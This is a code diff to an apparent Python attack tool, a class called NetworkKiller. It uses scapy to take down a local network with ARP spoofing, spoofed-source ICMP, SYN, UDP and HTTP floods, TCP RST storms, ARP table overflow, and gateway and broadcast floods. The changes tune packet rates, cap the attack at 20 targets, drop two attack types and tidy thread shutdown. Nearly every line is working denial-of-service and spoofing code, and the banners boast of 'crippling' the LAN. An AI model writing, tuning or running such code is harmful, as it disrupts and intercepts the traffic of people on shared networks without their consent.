@@ -427,15 +427,17 @@ class NetworkKiller:
         try:
             while self.attacking:
                 try:
-                    # Send packets as fast as possible
-                    for _ in range(200):
+                    # Send packets as fast as possible in short bursts
+                    for _ in range(40):
+                        if not self.attacking:
+                            break
                         scapy.send(target_pkt, verbose=0, iface=scapy.conf.iface)
                         scapy.send(gateway_pkt, verbose=0, iface=scapy.conf.iface)
                         count += 2
                     
                     self.safe_print(f"[ARP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                    time.sleep(0.001)  # Minimal delay
-                except Exception as e:
+                    time.sleep(0.002)
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -486,20 +488,21 @@ class NetworkKiller:
         count = 0
         error_count = 0
         try:
+            src_pool = tuple(self.random_source_ips)
             while self.attacking:
                 try:
-                    for _ in range(500):  # 10x more packets
-                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
-                        payload_size = 1500  # Max size
+                    for _ in range(100):
+                        if not self.attacking:
+                            break
+                        src_ip = random.choice(src_pool) if src_pool else self.own_ip
+                        payload_size = 1200
                         pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                               ICMP(type=8, code=0, seq=random.randint(1, 65535)) / \
                               scapy.Raw(load=os.urandom(payload_size))
-                        
                         scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[FLOOD {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -509,21 +512,21 @@ class NetworkKiller:
         count = 0
         error_count = 0
         try:
+            src_pool = tuple(self.random_source_ips)
             while self.attacking:
                 try:
-                    for _ in range(300):  # Massive SYN flood
-                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
+                    for _ in range(80):
+                        if not self.attacking:
+                            break
+                        src_ip = random.choice(src_pool) if src_pool else self.own_ip
                         src_port = random.randint(1024, 65535)
                         target_port = random.choice([80, 443, 22, 21, 25, 3306, 5432, 8080, 8443])
-                        
                         syn_pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                                  TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000000, 9999999))
-                        
                         scapy.send(syn_pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[SYN {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -533,23 +536,23 @@ class NetworkKiller:
         count = 0
         error_count = 0
         try:
+            src_pool = tuple(self.random_source_ips)
             while self.attacking:
                 try:
-                    for _ in range(1000):  # Extreme UDP flooding
-                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
+                    for _ in range(120):
+                        if not self.attacking:
+                            break
+                        src_ip = random.choice(src_pool) if src_pool else self.own_ip
                         src_port = random.randint(1024, 65535)
                         target_port = random.randint(1, 65535)
-                        
-                        payload = os.urandom(1500)  # Max UDP payload
+                        payload = os.urandom(1200)
                         pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                               UDP(sport=src_port, dport=target_port) / \
                               scapy.Raw(load=payload)
-                        
                         scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[UDP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -559,23 +562,23 @@ class NetworkKiller:
         count = 0
         error_count = 0
         try:
+            src_pool = tuple(self.random_source_ips)
             while self.attacking:
                 try:
-                    for _ in range(500):  # Massive RST storm
-                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
+                    for _ in range(100):
+                        if not self.attacking:
+                            break
+                        src_ip = random.choice(src_pool) if src_pool else self.own_ip
                         src_port = random.randint(1024, 65535)
                         target_port = random.randint(1, 65535)
                         seq = random.randint(1000000, 9999999)
                         ack = random.randint(1000000, 9999999)
-                        
                         rst_pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                                  TCP(sport=src_port, dport=target_port, flags="R", seq=seq, ack=ack)
-                        
                         scapy.send(rst_pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[RST {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -587,21 +590,20 @@ class NetworkKiller:
         try:
             while self.attacking:
                 try:
-                    for _ in range(200):  # Massive HTTP requests
+                    for _ in range(50):
+                        if not self.attacking:
+                            break
                         src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                         src_port = random.randint(1024, 65535)
-                        path = f"/{os.urandom(50).hex()}"
-                        
+                        path = f"/{os.urandom(30).hex()}"
                         http_req = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
                         pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                               TCP(sport=src_port, dport=80, flags="PA", seq=random.randint(1000000, 9999999)) / \
                               scapy.Raw(load=http_req)
-                        
                         scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[HTTP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -613,19 +615,18 @@ class NetworkKiller:
         try:
             while self.attacking:
                 try:
-                    for _ in range(500):  # Extreme ARP entries
+                    for _ in range(80):
+                        if not self.attacking:
+                            break
                         fake_ip_parts = target_ip.split(".")
                         fake_ip = f"{fake_ip_parts[0]}.{fake_ip_parts[1]}.{fake_ip_parts[2]}.{random.randint(1, 254)}"
                         fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
-                        
                         arp_pkt = scapy.ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, 
                                            pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
-                        
                         scapy.send(arp_pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
-                    
                     self.safe_print(f"[ARPT {target_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -668,7 +669,9 @@ class NetworkKiller:
             while self.attacking:
                 try:
                     # Flood gateway with ARP
-                    for _ in range(100):
+                    for _ in range(30):
+                        if not self.attacking:
+                            break
                         fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                         arp_pkt = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=fake_mac, 
                                            pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
@@ -676,7 +679,9 @@ class NetworkKiller:
                         count += 1
                     
                     # SYN flood gateway
-                    for _ in range(200):
+                    for _ in range(80):
+                        if not self.attacking:
+                            break
                         src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                         syn_pkt = IP(dst=self.gateway_ip, src=src_ip, ttl=64) / \
                                  TCP(sport=random.randint(1024, 65535), dport=80, flags="S", seq=random.randint(1000000, 9999999))
@@ -684,16 +689,18 @@ class NetworkKiller:
                         count += 1
                     
                     # UDP flood gateway
-                    for _ in range(500):
+                    for _ in range(120):
+                        if not self.attacking:
+                            break
                         src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                         pkt = IP(dst=self.gateway_ip, src=src_ip, ttl=64) / \
                               UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) / \
-                              scapy.Raw(load=os.urandom(1500))
+                              scapy.Raw(load=os.urandom(1200))
                         scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
                     
                     self.safe_print(f"[GWY {self.gateway_ip}] Packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -709,26 +716,29 @@ class NetworkKiller:
             while self.attacking:
                 try:
                     # ARP broadcast storm
-                    for _ in range(300):
+                    for _ in range(100):
+                        if not self.attacking:
+                            break
                         fake_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{random.randint(1, 254)}"
                         fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
-                        
                         arp_pkt = scapy.ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, 
                                            pdst=broadcast, hwdst="ff:ff:ff:ff:ff:ff")
                         scapy.send(arp_pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
                     
                     # ICMP broadcast flood
-                    for _ in range(500):
+                    for _ in range(150):
+                        if not self.attacking:
+                            break
                         fake_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{random.randint(1, 254)}"
                         pkt = IP(dst=broadcast, src=fake_ip, ttl=64) / \
                               ICMP(type=8, code=0, seq=random.randint(1, 65535)) / \
-                              scapy.Raw(load=os.urandom(1500))
+                              scapy.Raw(load=os.urandom(1200))
                         scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                         count += 1
                     
                     self.safe_print(f"[STORM] Broadcast packets: {count:<8} | Errors: {error_count}")
-                except Exception as e:
+                except Exception:
                     error_count += 1
         except:
             pass
@@ -738,6 +748,10 @@ class NetworkKiller:
         if not self.selected_targets:
             print("[-] No targets selected!")
             return
+
+        if len(self.selected_targets) > 20:
+            print(f"[!] Large network detected: limiting active attack set to first 20 of {len(self.selected_targets)} targets.")
+            self.selected_targets = self.selected_targets[:20]
         
         print("\n" + "="*60)
         print("[*] Initializing network crippling mode...")
@@ -751,9 +765,9 @@ class NetworkKiller:
         
         print("\n" + "="*60)
         print("[!] MAXIMUM ASSAULT - CRIPPLING ENTIRE LAN!")
-        print("[!] 11 concurrent attacks per device + Gateway + Broadcast")
+        print("[!] 5 concurrent attacks per device + Gateway + Broadcast")
         print("="*60)
-        print("\n[*] Attacks: ARP | DNS | ICMP | SYN | UDP | RST | HTTP | ARPT | DHCP + Gateway + Broadcast\n")
+        print("\n[*] Attacks: ARP | ICMP | SYN | UDP | RST | Gateway + Broadcast\n")
         
         self.attacking = True
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
@@ -762,44 +776,33 @@ class NetworkKiller:
         self.attack_threads = []
         
         for target in self.selected_targets:
-            # 9 attacks per target device
-            for idx in range(1, 10):
-                if idx == 1:
-                    t = threading.Thread(target=self.arp_spoof, args=(target['ip'], target['mac']), daemon=False)
-                elif idx == 2:
-                    t = threading.Thread(target=self.dns_spoof, args=(target['ip'],), daemon=False)
-                elif idx == 3:
-                    t = threading.Thread(target=self.packet_flood, args=(target['ip'],), daemon=False)
-                elif idx == 4:
-                    t = threading.Thread(target=self.syn_flood, args=(target['ip'],), daemon=False)
-                elif idx == 5:
-                    t = threading.Thread(target=self.udp_flood, args=(target['ip'],), daemon=False)
-                elif idx == 6:
-                    t = threading.Thread(target=self.tcp_rst_attack, args=(target['ip'],), daemon=False)
-                elif idx == 7:
-                    t = threading.Thread(target=self.http_flood, args=(target['ip'],), daemon=False)
-                elif idx == 8:
-                    t = threading.Thread(target=self.arp_table_overflow, args=(target['ip'],), daemon=False)
-                elif idx == 9:
-                    t = threading.Thread(target=self.dhcp_starvation, args=(target['ip'],), daemon=False)
-                
+            target_actions = [
+                (self.arp_spoof, (target['ip'], target['mac'])),
+                (self.packet_flood, (target['ip'],)),
+                (self.syn_flood, (target['ip'],)),
+                (self.udp_flood, (target['ip'],)),
+                (self.tcp_rst_attack, (target['ip'],)),
+            ]
+
+            for action, args in target_actions:
+                t = threading.Thread(target=action, args=args, daemon=True)
                 t.start()
                 self.attack_threads.append(t)
-                time.sleep(0.01)  # Stagger thread starts
+                time.sleep(0.005)
         
         # Gateway attack threads
-        for _ in range(3):
-            t = threading.Thread(target=self.gateway_attack, daemon=False)
+        for _ in range(2):
+            t = threading.Thread(target=self.gateway_attack, daemon=True)
             t.start()
             self.attack_threads.append(t)
-            time.sleep(0.01)
+            time.sleep(0.005)
         
         # Broadcast storm threads
         for _ in range(2):
-            t = threading.Thread(target=self.broadcast_storm, daemon=False)
+            t = threading.Thread(target=self.broadcast_storm, daemon=True)
             t.start()
             self.attack_threads.append(t)
-            time.sleep(0.01)
+            time.sleep(0.005)
         
         print(f"[+] ASSAULT LAUNCHED: {len(self.attack_threads)} threads active")
         print(f"[+] Targets: {len(self.selected_targets)}")
@@ -809,6 +812,7 @@ class NetworkKiller:
             while self.attacking:
                 time.sleep(0.5)
         except KeyboardInterrupt:
+            print("\n[*] Keyboard interrupt received, stopping attacks...")
             self.stop_attacks()
 
     def stop_attacks(self):
@@ -824,7 +828,10 @@ class NetworkKiller:
         print("[*] Waiting for threads to terminate...")
         stopped = 0
         for i, thread in enumerate(self.attack_threads):
-            thread.join(timeout=1)
+            try:
+                thread.join(timeout=0.1)
+            except KeyboardInterrupt:
+                continue
             if not thread.is_alive():
                 stopped += 1
         
